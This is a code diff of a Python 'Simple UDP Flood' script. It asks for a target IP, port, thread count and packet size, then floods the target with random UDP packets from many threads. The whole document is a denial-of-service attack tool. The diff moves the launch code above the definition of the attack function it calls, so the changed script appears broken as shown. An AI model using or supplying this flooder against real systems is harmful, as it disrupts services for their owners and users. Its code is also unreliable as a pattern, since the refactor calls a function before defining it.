@@ -5,19 +5,17 @@ import threading
 import random
 import socket
 
-def main():
-  global ip, port, threads, conn, psize
-  print("""
+print("""
   Simple UDP Flood
-  """)
-  ip = str(input("IP Target: "))
-  port = int(input("Port Target: "))
-  threads = int(input("Threads: "))
-  conn = int(input("Multi Packet: "))
-  psize = int(input("Packet Size: "))
-  for x in range(threads):
-    t = threading.Thread(target=attack)
-    t.start()
+""")
+ip = str(input("IP Target: "))
+port = int(input("Port Target: "))
+threads = int(input("Threads: "))
+conn = int(input("Multi Packet: "))
+psize = int(input("Packet Size: "))
+for x in range(threads):
+  t = threading.Thread(target=attack)
+  t.start()
 
 def attack():
   pkt = random._urandom(psize)
@@ -30,5 +28,3 @@ def attack():
         s.sendto(pkt, (ip,port))
     except:
       s.close()
-
-main()
